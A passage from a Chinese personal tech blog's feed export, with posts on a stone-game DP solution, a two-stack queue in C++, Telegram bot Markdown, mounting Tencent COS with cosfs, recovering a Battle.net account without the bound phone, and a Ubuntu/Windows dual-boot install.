class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[n] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">solve</span>(n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终解法"><a href="#最终解法" class="headerlink" title="最终解法"></a>最终解法</h2><p>打印dp数组，发现(n%15)==0,2,4,6时为0，其他都为1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = n % <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (left == <span class="number">0</span> || left == <span class="number">2</span> || left == <span class="number">4</span> || left == <span class="number">6</span>)</span><br><span class="line">        cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">solve</span>(n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><p>n=1~15的结果可直接求得：n=2, 4, 6, 15时，先手必输。<br>然后只需要保证：n+15胜负仍相同<br>即：当n&gt;15时，无论先手方如何选取，后手方都存在策略使得总石子数减少15后，取石头的人仍是先手<br>即：无论先手方如何选取，后手方都有办法拿到这15个石头中的最后一个<br>而n=15时，先手必输，即后手必胜，也就是说满足上述假设。<br>所以n+15之后，先手仍然必输。</p>
<h2 id="引申"><a href="#引申" class="headerlink" title="引申"></a>引申</h2><p>如果被迫拿到最后一个石子的输，则n%15 =1, 3, 5, 7时，先手必输。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_44378358/article/details/103166981">取石头游戏</a></p>
]]></content>
      <tags>
        <tag>OJ</tag>
      </tags>
  </entry>
  <entry>
    <title>telegram机器人返回markdown格式</title>
    <url>/2018/12/03/tgbot-ret-md/</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>让telegram机器人使用markdown语法渲染，并返回信息</p>
<h2 id="修改处"><a href="#修改处" class="headerlink" title="修改处"></a>修改处</h2><p><code>sendMessage</code>设置<code>parse_mode</code>为<code>Markdown</code>即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sendMessage(text=<span class="string">&#x27;_test_&#x27;</span>,chat_id=chat_id, parse_mode=<span class="string">&#x27;Markdown&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>返回 <em>test</em></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bennythink.com/tgbot1.html">[Telegram bot 系列]1：requests 库、Inline Keyboard、Reply Keyboard 与其他细节</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>两个栈实现队列 (C++)</title>
    <url>/2019/11/05/two-stacks-to-implement-queue/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>栈先进后出，一般用数组实现<br>队列先进先出，一般用链表实现<br>考虑到最终目的是实现队列，自定义栈，使用链表结构</p>
<span id="more"></span>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参照<a href="https://stackoverflow.com/questions/69192/how-to-implement-a-queue-using-two-stacks">How to implement a queue using two stacks?</a><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/2-stacks-queue.png" alt="two-stacks-to-implement-queue"></p>
<p>代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(E it)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	inbox.<span class="built_in">push</span>(it);</span><br><span class="line">	size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">E <span class="title">pop_front</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (outbox.<span class="built_in">empty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (!inbox.<span class="built_in">empty</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			outbox.<span class="built_in">push</span>(inbox.<span class="built_in">pop</span>());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	size--;</span><br><span class="line">	<span class="keyword">return</span> outbox.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><h3 id="stl-stack"><a href="#stl-stack" class="headerlink" title="stl stack"></a>stl stack</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    stack&lt;E&gt; inbox;</span><br><span class="line">    stack&lt;E&gt; outbox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(E it)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        inbox.<span class="built_in">push</span>(it);</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">E <span class="title">pop_front</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (outbox.<span class="built_in">empty</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (!inbox.<span class="built_in">empty</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                E tmp = inbox.<span class="built_in">top</span>();</span><br><span class="line">                outbox.<span class="built_in">push</span>(tmp);</span><br><span class="line">                inbox.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        E tmp = outbox.<span class="built_in">top</span>();</span><br><span class="line">        outbox.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Queue&lt;<span class="keyword">int</span>&gt; que;</span><br><span class="line">    <span class="comment">//push 01234</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        que.<span class="built_in">push_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//pop 012</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; que.<span class="built_in">pop_front</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//push 78</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">7</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        que.<span class="built_in">push_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//pop all left elements (3478)</span></span><br><span class="line">    <span class="keyword">int</span> len = que.size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; que.<span class="built_in">pop_front</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="自实现Stack版本"><a href="#自实现Stack版本" class="headerlink" title="自实现Stack版本"></a>自实现Stack版本</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Linked Node</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	E data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&lt;</span>E&gt; *next;</span><br><span class="line">	Node&lt;E&gt;()</span><br><span class="line">	&#123;</span><br><span class="line">		next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Node</span>(E it, Node&lt;E&gt; *_next)</span><br><span class="line">	&#123;</span><br><span class="line">		data = it;</span><br><span class="line">		next = _next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Linked Based Stack</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Node&lt;E&gt; *head;</span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		head = <span class="keyword">new</span> Node&lt;E&gt;;</span><br><span class="line">		size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Stack</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">init</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">E <span class="title">top</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> head-&gt;data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(E it)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		head = <span class="keyword">new</span> Node&lt;E&gt;(it, head);</span><br><span class="line">		size++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">E <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		E tmp = <span class="built_in">top</span>();</span><br><span class="line">		size--;</span><br><span class="line">		Node&lt;E&gt; *temphead = head;</span><br><span class="line">		head = head-&gt;next;</span><br><span class="line">		<span class="keyword">delete</span> temphead;</span><br><span class="line">		<span class="keyword">return</span> tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Queue implement</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Stack&lt;E&gt; inbox;</span><br><span class="line">	Stack&lt;E&gt; outbox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(E it)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		inbox.<span class="built_in">push</span>(it);</span><br><span class="line">		size++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function">E <span class="title">pop_front</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (outbox.<span class="built_in">empty</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (!inbox.<span class="built_in">empty</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				outbox.<span class="built_in">push</span>(inbox.<span class="built_in">pop</span>());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		size--;</span><br><span class="line">		<span class="keyword">return</span> outbox.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Queue&lt;<span class="keyword">int</span>&gt; que;</span><br><span class="line">	<span class="comment">//push 01234</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		que.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//pop 012</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; que.<span class="built_in">pop_front</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//push 78</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">7</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		que.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//pop all left elements (3478)</span></span><br><span class="line">	<span class="keyword">int</span> len = que.size;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; que.<span class="built_in">pop_front</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>在服务器上部署腾讯云COS同步方案</title>
    <url>/2018/12/01/txcos-as-imgurl/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>由于截图后手动上传到COS比较麻烦，而<a href="https://github.com/ShareX/ShareX">ShareX</a>（一个截图工具）支持SFTP上传到服务器<br>于是决定在服务器上配置腾讯云COS同步方案，然后就可以愉快地截图后上传图片了</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>在腾讯云的对象存储（COS）配置好密钥以后，在服务器上配置同步方案<br>（建议设置一个用户组给予COS读写权限）</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install automake gcc-c++ git libcurl-devel libxml2-devel fuse-devel make openssl-devel</span><br></pre></td></tr></table></figure>
<h3 id="安装cosfs"><a href="#安装cosfs" class="headerlink" title="安装cosfs"></a>安装cosfs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tencentyun/cosfs-v4.2.1 /usr/cosfs</span><br><span class="line"><span class="built_in">cd</span> /usr/cosfs</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="修改配置文件-格式为bucket-name-bucket-appid-secretId-secredKey"><a href="#修改配置文件-格式为bucket-name-bucket-appid-secretId-secredKey" class="headerlink" title="修改配置文件(格式为bucket_name-bucket_appid:secretId:secredKey)"></a>修改配置文件(格式为<code>bucket_name-bucket_appid:secretId:secredKey</code>)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> xhy-1252675344:AKIDXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXX &gt; /etc/passwd-cosfs</span><br><span class="line">chmod 640 /etc/passwd-cosfs</span><br></pre></td></tr></table></figure>
<h3 id="挂载-以挂载到-usr-upload-为例"><a href="#挂载-以挂载到-usr-upload-为例" class="headerlink" title="挂载(以挂载到/usr/upload/为例)"></a>挂载(以挂载到<code>/usr/upload/</code>为例)</h3><p>格式为<code>cosfs bucket_appid:bucket_name 挂载目录 -ourl=对象储存url -odbglevel=info</code><br>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cosfs 1252675344:xhy /usr/upload/ -ourl=xhy-1252675344.cos.ap-beijing.myqcloud.com -odbglevel=info</span><br></pre></td></tr></table></figure>
<h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fusermount -u /u01/docker/kenny_hexo/public</span><br><span class="line">或者</span><br><span class="line">umount -l /u01/docker/kenny_hexo/public</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.234du.com/1167.html">ImgURL配合腾讯云COS（对象存储）搭建个人图床</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>无手机号 解除战网通行证锁定</title>
    <url>/2021/12/05/unlock-battlenet-acconut/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>绑定的身份证是随机生成的，绑定手机号已注销，仅邮箱可用</p>
<p>注销登陆后提示手机短信验证，由于无法接收验证码，故无法登录</p>
<h2 id="解锁方式"><a href="#解锁方式" class="headerlink" title="解锁方式"></a>解锁方式</h2><p>操作来自<a href="https://www.iyingdi.com/tz/post/5022004">账号丢了，求助-旅法师营地</a>，笔者验证成功</p>
<span id="more"></span>
<h3 id="1-多次登录，触发邮件重置密码（推荐）"><a href="#1-多次登录，触发邮件重置密码（推荐）" class="headerlink" title="1. 多次登录，触发邮件重置密码（推荐）"></a>1. 多次登录，触发邮件重置密码（推荐）</h3><p>在PC浏览器上，打开<a href="https://www.battlenet.com.cn/login/zh/">战网登录页面</a>，使用正确密码多次尝试登录（点击<code>登录</code>-提示短信验证后返回-再次点击<code>登录</code>）。<br>此时会收到密码重置邮件。<br>点击链接重置密码后，使用同一浏览器环境绑定安全令（如果提示<code>安全令无效</code>，则将安全令的<code>-</code>去掉后再试）即可。</p>
<h3 id="2-拨打客服电话解冻"><a href="#2-拨打客服电话解冻" class="headerlink" title="2. 拨打客服电话解冻"></a>2. 拨打客服电话解冻</h3><p>工作时间（每天早上10点到晚上9点），拨打网易客服电话<code>057128090163</code><br>按数字5选择<code>账号冻结问题</code>，再按3<code>保护性冻结</code>，最后按2<code>人工服务</code><br>告知客服：手机号已注销，且身份证是网上找的，邮件仍可用，希望能够解冻<br>此时需要回答账号常用地点及上次登陆时间<br>之后等待客服提交表单，处理完成后会发送密码重置邮件<br>重置后绑定安全令即可</p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu18.04安装记录(与Win10双系统共存)</title>
    <url>/2019/02/16/ubuntu-install/</url>
    <content><![CDATA[<h2 id="第一步，分区"><a href="#第一步，分区" class="headerlink" title="第一步，分区"></a>第一步，分区</h2><p>Linux只有分区挂载目录的概念，所以需要在Windows下分出一块较大的未分配空间，不需要格式化</p>
<h2 id="下载镜像并写入U盘"><a href="#下载镜像并写入U盘" class="headerlink" title="下载镜像并写入U盘"></a>下载镜像并写入U盘</h2><p>下载完镜像以后，使用软碟通将镜像写入U盘，然后重启。<br>PS: 如果U盘本身就支持efi启动的话，可以直接把镜像解压到U盘<br>开机后把握时机进入Boot Menu，选择从USB启动。<br>注意：需要在BIOS中关闭安全启动（Secure Boot）</p>
<span id="more"></span>
<h2 id="安装Ubuntu"><a href="#安装Ubuntu" class="headerlink" title="安装Ubuntu"></a>安装Ubuntu</h2><h3 id="进入安装程序"><a href="#进入安装程序" class="headerlink" title="进入安装程序"></a>进入安装程序</h3><p>正常情况下，启动后会出现grub引导菜单，选择第二个即可进入Ubuntu安装程序。<br>然而，由于我的显卡是Nvidia的，无法进入安装界面。</p>
<h4 id="英伟达显卡解决方案"><a href="#英伟达显卡解决方案" class="headerlink" title="英伟达显卡解决方案"></a>英伟达显卡解决方案</h4><p>在grub菜单画面时，按<code>e</code>编辑开机指令，<code>quite splash</code>改为<code>nomodeset</code><br>安装完毕重启后，同样方法进入系统，打开终端执行<br><code>sudo gedit /etc/default/grub</code><br>找到<code>quiet splash</code>将其改为<code>nomodeset</code>即可，更新grub后重启<br><code>sudo update-grub</code></p>
<h3 id="按步骤安装即可"><a href="#按步骤安装即可" class="headerlink" title="按步骤安装即可"></a>按步骤安装即可</h3><p>安装步骤参考<a href="https://blog.csdn.net/ysy950803/article/details/52643737">亲测UEFI启动模式的电脑安装Win10和Ubuntu双系统</a><br>以下步骤皆来自该博文<br>// 复制开始</p>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h4><p>如果你选择了安装更新和第三方软件，那么一定要记得联网，否则会卡死在最后的进度条上，所以最好不要勾选。另外，不要选择“与其它系统共存”那一项，而选择最后那个“其它选项（创建自己的分区）”。<br>最最最关键的就是分区这一步，这一步直接影响你安装双系统是否成功！找到刚才分割出的未分配空间，点”+“按钮来挂载分区。选择的时候一定要看清楚，一般来说根据大小就能判断，不要手滑把Win所在的空间给格式化掉了。并且，可能会看到一些几十MB或者一百来MB的已用空间，不要去动它们，可能是分区恢复盘之类的：</p>
<h4 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h4><p>swap和efi建议放在固态盘上</p>
<p>swap交换空间，这个也就是虚拟内存的地方，选择主分区和空间起始位置。如果你给Ubuntu系统分区容量足够的话，最好是能给到你物理内存的2倍大小，像我8GB内存，就可以给个16GB的空间给它，这个看个人使用情况，太小也不好，太大也没用。（其实我只给了8GB，没什么问题）</p>
<p>新建 efi系统分区 ， 选中逻辑分区 （这里不是主分区，请勿怀疑，老式的boot挂载才是主分区）和空间起始位置，大小最好不要小于256MB，系统引导文件都会在里面，如果这分区满了可能会带来未知问题。我给的512MB，它的作用和boot引导分区一样，只是引导方式不同。不要按照那些老教程去选boot引导分区，也就是最后你的挂载点里没有“/boot”这一项，否则你就没办法UEFI启动两个系统了。</p>
<p>挂载“/home” ， 类型为EXT4日志文件系统，选中逻辑分区和空间起始位置，这个相当于你的个人文件夹，类似Windows里的User，如果你是个娱乐向的用户，我建议最好能分配稍微大点，因为你的图片、视频、下载内容基本都在这里面，这些东西可不像在Win上面你想移动就能移动的。<br>总的来说，最好不要低于8GB，我Ubuntu分区的总大小是64GB，这里我给了12GB给home。<br>（这里特别提醒一下，Ubuntu最新发行版不建议强制获取Root权限，因为我已经玩崩过一次。所以你以后很多文档、图片、包括免安装软件等资源不得不直接放在home分支下面。你作为图形界面用户，只对home分支有完全的读写执行权限，其余分支例如usr你只能在终端使用sudo命令来操作文件，不利于存放一些直接解压使用的免安装软件。因此，建议home分支多分配一点空间，32GB最好……）</p>
<p>挂载“/usr” （也可以不挂，就直接包括在“/”当中），类型为EXT4日志文件系统，选中逻辑分区和空间起始位置，这个相当于你的软件安装位置，Linux下一般来说安装第三方软件你是没办法更改安装目录的，系统都会统一地安装到/usr目录下面，因此你就知道了，这个分区必须要大，我给了32GB。</p>
<p>最后，挂载“/” ，类型为EXT4日志文件系统，选中逻辑分区和空间起始位置，<br>因为除了home和usr还有很多别的目录，但那些都不是最重要的，“/”就把除了之前你挂载的home和usr外的全部杂项囊括了，大小也不要太小，最好不低于8GB。如果你非要挨个仔细分配空间，那么你需要知道这些各个分区的含义（Linux(ubuntu)分区挂载点介绍）<br>不过就算你把所有目录都自定义分配了空间也必须要给“/”挂载点分配一定的空间。</p>
<h4 id="重要提示"><a href="#重要提示" class="headerlink" title="重要提示"></a>重要提示</h4><p>分配好各个挂载点后，还有一个至关重要的步骤，那就是选择“安装引导启动器的设备”，默认是错误的，既然我们为Ubuntu分配了efi系统引导分区，那么显然，这里应该把它改成刚刚分配efi引导的那个分区。<br>// 复制结束</p>
<h4 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h4><p>安装成功后，会提示重启（记得拔掉U盘）。</p>
<h3 id="个人经验"><a href="#个人经验" class="headerlink" title="个人经验"></a>个人经验</h3><p>由于初始分辨率太低了，我分完区以后点击不了下一步= =（使用Tab和方向键也切换不过去）。<br>最后把安装语言设置成了英文，下一步显示出来了。<br>安装过程中可能会黑屏，只是系统关闭了显示器的正常现象，不必惊慌。<br>我的是Ubuntu所有分区都在机械硬盘上，然后重启后还是显示出了windows系统</p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="未安装驱动，分辨率太低"><a href="#未安装驱动，分辨率太低" class="headerlink" title="未安装驱动，分辨率太低"></a>未安装驱动，分辨率太低</h3><h4 id="临时解决方案"><a href="#临时解决方案" class="headerlink" title="临时解决方案"></a>临时解决方案</h4><p><code>sudo gedit /etc/default/grub</code><br>找到文件中的分辨率相关内容，将其分辨率改为你屏幕的分辨率，例如<code>1920X1080</code><br><code>sudo update-grub</code><br>更新后重启</p>
<h4 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h4><p>自行搜索自己显卡驱动在Linux下的安装方法（手动滑稽）</p>
<h2 id="引导界面美化"><a href="#引导界面美化" class="headerlink" title="引导界面美化"></a>引导界面美化</h2><p>可以使用<code>burg</code>替代<code>grub</code>引导界面（似乎是通过修改grub文件实现）<br>也可以直接在<a href="https://www.gnome-look.org/browse/cat/109/ord/latest/">GRUB Themes </a>上下载自己喜欢的主题，解压后执行<code>install.sh</code>安装即可。<br>安装完成后可以在<code>/boot/grub/themes/</code>中找到新生成的对应主题文件夹<br>如果无效请修改引导文件<code>/etc/default/grub</code><br><code>GRUB_THEME</code>改成自己下载的主题路径</p>
<h2 id="修改引导顺序及选项"><a href="#修改引导顺序及选项" class="headerlink" title="修改引导顺序及选项"></a>修改引导顺序及选项</h2><h3 id="1-纯命令行方式修改顺序"><a href="#1-纯命令行方式修改顺序" class="headerlink" title="1. 纯命令行方式修改顺序"></a>1. 纯命令行方式修改顺序</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mv /etc/grub.d/30_os-prober /etc/grub.d/08_os-prober</span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure>
<p>该命令是将etc文件夹下的grub.d文件夹下的<code>30_os-prober</code>文件改名为<code>08_os-prober</code>。（08可以改为06~09都可以，只要更小）。Ubuntu的启动项相关文件名为“10_….”这样就可以将windows的启动项放在Ubuntu前面，即启动项列表的第一个。由于引导程序默认启动第一个启动项，所以这样就可以先启动windows了。注意修改完后更新一下grub才能生效（即命令sudo update-grub）。</p>
